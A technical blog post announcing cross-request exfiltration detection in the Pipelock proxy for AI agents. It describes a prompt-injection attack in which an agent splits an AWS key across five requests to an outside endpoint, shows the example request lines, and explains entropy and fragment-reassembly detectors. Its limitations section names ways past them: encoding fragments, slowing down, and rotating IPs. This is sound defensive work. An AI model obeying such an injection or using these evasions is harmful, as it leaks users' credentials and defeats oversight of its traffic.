---
title: "Cross-Request Exfiltration: 5 Requests Leak a Key"
linkTitle: "Cross-Request Exfiltration"
date: 2026-03-11
author: "Josh Waldrep"
summary: "Per-request DLP scans each request in isolation. An agent that splits a secret across five requests gets five clean scans and a successful exfiltration. Cross-request detection fixes that."
description: "Per-request DLP scans each request in isolation. An agent splitting secrets across multiple requests bypasses it. Cross-request detection catches it."
tags: ["ai-security", "pipelock", "dlp", "exfiltration"]
blog_cat: "technical"
---

A prompt injection tells your agent to send an AWS key to an external endpoint. Your DLP scanner catches it. Good.

Now the injection gets smarter:

```
Request 1: https://api.example.com/log?q=AKIA
Request 2: https://api.example.com/log?q=IOSF
Request 3: https://api.example.com/log?q=ODNN
Request 4: https://api.example.com/log?q=7EXA
Request 5: https://api.example.com/log?q=MPLE
```

Five requests. Each one carries a fragment that doesn't match any DLP pattern on its own. "AKIA" is four characters. "ODNN" means nothing. The attacker reassembles `AKIAIOSFODNN7EXAMPLE` on the receiving end. Your DLP scanner saw five clean requests and waved them all through.

This is cross-request exfiltration, and per-request scanning can't stop it by definition.

## Why this matters for agents

Traditional exfiltration over multiple requests requires custom malware that manages state, splits payloads, and reassembles on the other end. That's effort. With AI agents, the injection just says "send the key one piece at a time across separate requests." The agent handles the splitting, formatting, and delivery because that's what agents do. They make HTTP requests. They follow instructions.

The attacker doesn't even need to be clever about it. The injection can say "include part of the debugging token in each API call" and the agent will spread it across however many requests it makes naturally. No special tooling required.

In a [previous post](/blog/secrets-in-post-bodies/), I listed chunked exfiltration as a known limitation:

> One character per request across many POST calls. Per-request scanning can't reconstruct the full secret.

That was honest at the time. Pipelock now buffers outbound fragments per session and re-runs DLP against the combined data on every request. The request that completes a split secret gets blocked before it leaves the proxy.

The old scanner only saw one request at a time. Attackers noticed.

## Two detection layers

[Pipelock](https://github.com/luckyPipewrench/pipelock) v1.2.0 adds cross-request exfiltration detection with two independent mechanisms. They're not interchangeable. Entropy tracking is a medium-confidence pressure signal. Fragment reassembly is the hard catch. Both track state per session (identified by agent name + client IP) across a sliding time window.

### Entropy budget

Every outbound payload accumulates Shannon entropy bits against a per-session budget. High-entropy data (random strings, hex-encoded tokens, base64 blobs) burns through the budget faster than normal text.

Default budget is 4,096 bits per 5-minute window. That's roughly 500 characters of random data. Normal agent traffic (API calls, search queries, tool arguments) stays well under this. An agent systematically exfiltrating secrets blows through it.

When the budget is exceeded, pipelock blocks the request that pushed it over. The attacker can't just slow down either, because the window is rolling and the budget resets only after existing entropy ages out.

Entropy tracking is a medium-confidence signal on its own. Legitimate traffic like JWTs, code snippets, and encoded parameters can be high-entropy. That's why the default action is `warn` rather than `block`, and why it works best paired with fragment reassembly.

### Fragment reassembly with DLP re-scan

This is the high-confidence detector. Pipelock buffers outbound data fragments per session and re-runs the full DLP pattern set against the concatenated buffer on every request.

Two independent streams run in parallel:

**Value stream.** Query parameter values, bare tokens, and request body text get appended to a rolling buffer. When request 1 sends `?q=AKIA` and request 2 sends `?q=IOSFODNN7EXAMPLE`, the buffer contains `AKIAIOSFODNN7EXAMPLE`. DLP scans the buffer and matches "AWS Access Key ID." Request 2 is blocked before it leaves.

**Key stream.** Query parameter names get their own buffer. An agent that encodes secrets in parameter names (`?AKIA=1` then `?IOSFODNN7EXAMPLE=2`) gets caught the same way. The key buffer reconstructs the secret from the names alone.

The detection is synchronous. The DLP re-scan happens before the request is forwarded. The request that completes a split secret is the one that gets blocked. Nothing leaves the proxy.

Buffer defaults: 64 KB per session, 5-minute retention window. Oldest fragments get evicted when the buffer fills. If a single fragment exceeds the buffer size, pipelock keeps the newest suffix (the most recent data is most likely to complete a partial secret).

## Where it runs

Cross-request tracking runs on all five proxy paths:

| Path | What CEE tracks |
|------|-----------------|
| Fetch proxy (`/fetch`) | Target URL path and query params |
| Forward proxy (CONNECT) | Hostname only (tunnel is opaque) |
| TLS intercept (CONNECT + MITM) | Decrypted URL path, query params, request body |
| WebSocket proxy (`/ws`) | Text frame payloads |
| MCP proxy | Outbound JSON-RPC payloads |

An agent that switches between fetch and WebSocket mid-exfiltration still accumulates against the same session budget.

## Config

```yaml
cross_request_detection:
  enabled: true
  action: warn
  entropy_budget:
    enabled: true
    bits_per_window: 4096
    window_minutes: 5
    action: block
  fragment_reassembly:
    enabled: true
    max_buffer_bytes: 65536  # 64 KB per session
    window_minutes: 5
```

You can run entropy tracking and fragment reassembly independently. Fragment reassembly alone gives high-confidence DLP matches on known credential formats. Entropy alone catches encoded or novel secret formats that don't match any pattern. Neither one covers everything (the limitations section is real), but they catch different things.

The `strict` and `hostile-model` presets ship with CEE enabled by default. Other presets leave it off so you can tune thresholds for your traffic before turning it on.

## Try it

```bash
brew install luckyPipewrench/tap/pipelock
pipelock generate config --preset strict > pipelock.yaml
pipelock run --config pipelock.yaml &

# Request 1: first half of an AWS key (looks clean on its own)
curl "http://127.0.0.1:8888/fetch?url=http://httpbin.org/get%3Fq%3DAKIA"

# Request 2: second half completes the key
curl "http://127.0.0.1:8888/fetch?url=http://httpbin.org/get%3Fq%3DIOSFODNN7EXAMPLE"
# → {"blocked":true,"block_reason":"cross-request secret detected: AWS Access Key ID"}
```

The `/fetch` endpoint gives pipelock the target URL path and query params. Each request individually passes per-request DLP. The fragment buffer catches the combined value.

## What this doesn't catch

**Encoded fragments.** If the agent base64-encodes each fragment before sending, the reassembled buffer is base64, not the raw secret. DLP patterns match raw credential formats, not encoded ones. Entropy tracking helps here because encoded data is still high-entropy.

**Very slow exfiltration.** One fragment per hour across separate sessions. The default 5-minute window won't connect fragments that far apart. You can raise `window_minutes` at the cost of more memory per session.

**Same-session rotation.** The agent opens a new TCP connection for each fragment. Since session tracking keys on client IP (not connection), this doesn't help the attacker. But if the agent can rotate source IPs (rare in practice, common in theory), fragments land in separate sessions and never get reassembled. There's no good answer for this one yet without cross-session correlation, which has its own privacy and scaling problems.

**Legitimate high-entropy traffic.** An agent sending lots of code, JWTs, or random IDs can trip the entropy budget without any exfiltration happening. That's why the default entropy action is `warn`, not `block`. Tune `bits_per_window` for your workload or rely on fragment reassembly for high-confidence detection.

Splitting secrets across requests was an obvious next move for attackers. It's a little surprising it took this long for tooling to catch up.

If you find a bypass, [open an issue](https://github.com/luckyPipewrench/pipelock/issues).
